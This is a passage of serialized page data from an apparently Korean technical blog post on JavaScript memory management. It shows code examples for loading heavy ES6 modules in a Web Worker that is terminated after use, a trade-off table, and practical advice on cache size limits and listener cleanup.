operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword null nil\",\"children\":\"null\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 필요시 새 워커 생성 (모듈 다시 로드)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[\"worker \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/heavy-worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"-핵심-전략-워커를-통한-프로그래밍적-메모리-관리\",\"children\":\"💡 핵심 전략: 워커를 통한 프로그래밍적 메모리 관리\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"맞습니다! 워커 + onmessage 패턴으로 ES6 모듈의 메모리를 제어할 수 있습니다:\"}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🔴 메인 스레드: 모듈 영구 보존\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" heavyProcess \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./heavy-lib.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 영구 메모리 점유\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" result \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"heavyProcess\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🟢 워커 패턴: 필요할 때만 메모리 사용\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"class\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ModuleExecutor\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"async\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"executeWithModule\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":[\"modulePath\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" methodName\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\"]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 1. 워커 생성 (모듈 로드)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" worker \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/executor-worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 2. 작업 실행\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" result \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Promise\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":[\"resolve\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" reject\"]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[\"      worker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method-variable function-variable method function property-access\",\"children\":\"onmessage\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"e\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"resolve\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"      worker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"onerror\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" reject\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[\"      worker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"postMessage\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" modulePath\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" methodName\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"17\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"18\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 3. 워커 종료 (모듈 메모리 해제!)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"19\",\"children\":[\"    worker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"terminate\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"20\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"21\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" result\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"22\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"23\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"24\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"25\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// executor-worker.js\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"26\",\"children\":[\"self\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method-variable function-variable method function property-access\",\"children\":\"onmessage\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"async\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"e\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"27\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" modulePath\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" methodName\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" e\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"28\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"29\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 동적으로 모듈 로드\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"30\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" module \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"modulePath\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"31\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"32\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 메서드 실행\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"33\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" result \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" module\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],\"methodName\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"34\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"35\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 결과 반환\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"36\",\"children\":[\"  self\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"postMessage\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"result\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"37\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 워커 종료 시 이 모듈도 함께 해제됨!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"38\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"39\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"40\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 사용 예\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"41\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" executor \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ModuleExecutor\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"42\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"43\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// heavy-lib.js를 필요할 때만 로드하고 즉시 해제\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"44\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" result \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" executor\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"executeWithModule\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"45\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./heavy-lib.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"46\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'processData'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"47\",\"children\":\"  myData\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"48\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"49\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// heavy-lib.js 메모리 완전 해제됨! ✨\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"️-트레이드오프-정리\",\"children\":\"⚖️ 트레이드오프 정리\"}],\"\\n\",[\"$\",\"table\",null,{\"children\":[[\"$\",\"thead\",null,{\"children\":[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{\"children\":\"접근 방식\"}],[\"$\",\"th\",null,{\"children\":\"메모리 관리\"}],[\"$\",\"th\",null,{\"children\":\"성능\"}],[\"$\",\"th\",null,{\"children\":\"복잡도\"}]]}]}],[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"메인 스레드 import\"}]}],[\"$\",\"td\",null,{\"children\":\"❌ 영구 보존\"}],[\"$\",\"td\",null,{\"children\":\"⚡ 빠른 재사용\"}],[\"$\",\"td\",null,{\"children\":\"😊 단순\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"워커 일회성 사용\"}]}],[\"$\",\"td\",null,{\"children\":\"✅ 완전 해제 가능\"}],[\"$\",\"td\",null,{\"children\":\"🐢 매번 재로드\"}],[\"$\",\"td\",null,{\"children\":\"😐 중간\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"워커 풀 재사용\"}]}],[\"$\",\"td\",null,{\"children\":\"🔄 선택적 해제\"}],[\"$\",\"td\",null,{\"children\":\"⚡ 균형적\"}],[\"$\",\"td\",null,{\"children\":\"😅 복잡\"}]]}]]}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"결론: 큰 라이브러리나 가끔 사용하는 모듈은 워커 패턴으로 메모리를 절약할 수 있습니다!\"}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"️-현실적인-사용-권장사항\",\"children\":\"⚠️ 현실적인 사용 권장사항\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"워커 패턴은 일반적인 해결책이 아닙니다!\"}],\" 실제로는 다음과 같이 접근합니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🟢 일반적인 경우: 그냥 import 사용 (99% 케이스)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" utils \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./utils.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 대부분 OK\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" format \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'date-fns'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 라이브러리도 OK\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🟡 주의가 필요한 경우: 메모리 관리 전략 적용\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 1. 큰 데이터 캐시\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" cache \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Map\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token constant\",\"children\":\"MAX_CACHE_SIZE\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"100\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 크기 제한 필수!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 2. 이벤트 리스너\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" cleanup \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword null nil\",\"children\":\"null\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"init\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function-variable function\",\"children\":\"cleanup\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token 